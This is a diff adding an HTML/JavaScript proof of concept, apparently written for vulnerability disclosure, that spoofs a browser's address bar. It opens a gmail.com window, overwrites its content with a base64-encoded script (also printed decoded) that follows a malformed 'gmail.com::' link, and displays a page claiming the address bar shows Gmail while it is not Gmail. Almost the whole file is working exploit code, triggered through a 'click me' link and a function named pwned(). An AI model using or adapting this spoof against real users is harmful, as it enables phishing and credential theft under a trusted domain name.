@@ -1,0 +1,22 @@
+<script>
+
+payload="PGJvZHk+PC9ib2R5Pg0KPHNjcmlwdD4NCiAgICB2YXIgbGluayA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2EnKTsNCiAgICBsaW5rLmhyZWYgPSAnaHR0cHM6Ly9nbWFpbC5jb206Oic7DQogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChsaW5rKTsNCiAgICBsaW5rLmNsaWNrKCk7DQo8L3NjcmlwdD4=";
+
+function pwned() {
+    var t = window.open('https://www.gmail.com', 'aaaa');
+    t.document.write(atob(payload));
+    t.document.write("<h1>Address bar says https://www.gmail.com - this is NOT https://www.gmail.com</h1>");
+    
+}
+
+</script>
+<a href="https://hack.com::/"  target="aaaa" onclick="setTimeout('pwned()','500')">click me</a><br>
+
+base64 payload code:
+<body></body>
+<script>
+    var link = document.createElement('a');
+    link.href = 'https://gmail.com::';
+    document.body.appendChild(link);
+    link.click();
+</script>
